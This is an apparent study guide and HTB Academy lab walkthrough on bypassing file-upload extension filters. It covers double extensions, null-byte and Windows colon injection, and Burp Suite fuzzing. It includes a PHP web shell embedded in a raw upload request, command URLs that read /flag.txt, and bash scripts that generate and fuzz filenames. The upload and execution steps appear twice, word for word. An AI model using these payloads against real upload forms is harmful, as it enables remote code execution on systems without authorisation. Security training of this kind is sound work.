# 🛰️ Introduction

## Overview

> **Objective:** This document provides a detailed guide on bypassing file upload filters that use both blacklist and whitelist mechanisms to restrict potentially malicious files.

[!INFO] **Note:** The techniques described here are for educational purposes only. Always ensure you have permission before testing systems or networks that do not belong to you.

## File Upload Filter Bypass Techniques

### Double Extensions
> **Double Extensions:** Abuse the way file extensions are interpreted by web servers and PHP engines to upload executable files disguised as images.

---

# 🖼️ Double Extension Attacks

[!SUCCESS] **Example Filename: `shell.jpg.php`**

- Ends with a valid image extension (`.jpg`)
- Contains a hidden PHP execution part before or after the image extension

**Implementation:**
```bash
# Filename: shell.jpg.php
```

### Burp Suite Fuzzing Setup
1. **Intercept upload request**
2. **Set payload position in filename**

[!SUCCESS] **Payload Position Example:**
```http
Content-Disposition: form-data; name="uploadFile"; filename="§wordlist_payload§"
```

**Double Extension Wordlist Generator Script**
```bash
#!/bin/bash
# Generate all double extension permutations

for ext1 in '.php' '.phtml' '.php3' '.php4' '.php5'; do
    for ext2 in '.jpg' '.jpeg' '.png' '.gif' '.bmp' '.ico'; do
        echo "shell$ext1$ext2" >> double_extension_wordlist.txt
        echo "shell$ext2$ext1" >> double_extension_wordlist.txt
    done
done

echo "Generated \$(wc -l < double_extension_wordlist.txt) filename permutations"
```

### Step-by-Step Walkthrough

**Step 3: Upload Web Shell**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

------boundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.jpg.php"
Content-Type: image/jpeg

<?php system(\$_REQUEST['cmd']); ?>
------boundary--
```

**Step 4: Execute Commands**
```bash
# Test execution
http://TARGET/uploads/shell.jpg.php?cmd=id

# Read flag
http://TARGET/uploads/shell.jpg.php?cmd=cat /flag.txt
```

---

## Character Injection Techniques

### Null Byte Injection

[!SUCCESS] **Classic PHP ≤ 5.X Bypass:**
```bash
# Filename: shell.php%00.jpg
# PHP interpretation: shell.php (stops at %00)
# Whitelist check: PASS (sees .jpg extension)
```

### Windows Colon Injection

**Windows-specific bypass:**
```bash
# Filename: shell.aspx:.jpg
# Windows interpretation: shell.aspx (ignores :)
# Whitelist check: PASS (sees .jpg extension)
```

---

## HTB Academy Lab Solution

### Lab Information
- **Objective:** Bypass blacklist and whitelist to upload PHP script
- **Target:** Read `/flag.txt` using uploaded shell
- **Techniques:** Double extensions, character injection

### Step-by-Step Walkthrough

**Step 1: Reconnaissance**
```bash
# Test basic PHP upload
filename="shell.php" → BLOCKED

# Test image upload  
filename="test.jpg" → SUCCESS

# Confirms whitelist filtering
```

**Step 2: Double Extension Bypass**
```bash
# Test: shell.jpg.php
# Whitelist: PASS (contains .jpg)
# Execution: SUCCESS (ends with .php)
```

**Step 3: Upload Web Shell**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

------boundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.jpg.php"
Content-Type: image/jpeg

<?php system(\$_REQUEST['cmd']); ?>
------boundary--
```

**Step 4: Execute Commands**
```bash
# Test execution
http://TARGET/uploads/shell.jpg.php?cmd=id

# Read flag
http://TARGET/uploads/shell.jpg.php?cmd=cat /flag.txt
```

### Expected Flag Format
```bash
HTB{...}
```

---

## Bypass Methodology

### Systematic Testing Approach

**1. Baseline Testing:**
```bash
# Test allowed extensions
.jpg, .jpeg, .png, .gif → SUCCESS
.php, .phtml, .php5 → BLOCKED
```

**2. Double Extension Testing:**
```bash
shell.jpg.php
shell.png.php  
shell.gif.phtml
```

**3. Reverse Double Extension:**
```bash
shell.php.jpg
shell.phtml.png
shell.php5.gif
```

**4. Character Injection:**
```bash
shell.php%00.jpg
shell.php%20.jpg
shell.aspx:.jpg
```

### Response Analysis

**Success Indicators:**
- HTTP 200 status code
- Upload confirmation message
- File accessible via direct URL
- Command execution works

**Failure Indicators:**
- HTTP 403/406 status codes
- "Only images allowed" messages
- File not accessible
- No command execution

---

# 🛠️ Tools for Testing

### Burp Suite Intruder:
- Load bypass wordlists
- Disable URL encoding
- Analyze response patterns
- Filter successful uploads

**Custom Fuzzing Scripts:**
```bash
#!/bin/bash
# Test double extensions
for ext in php phtml php3 php4 php5; do
    curl -X POST -F "file=@shell.\$ext.jpg" http://target/upload.php
done
```

---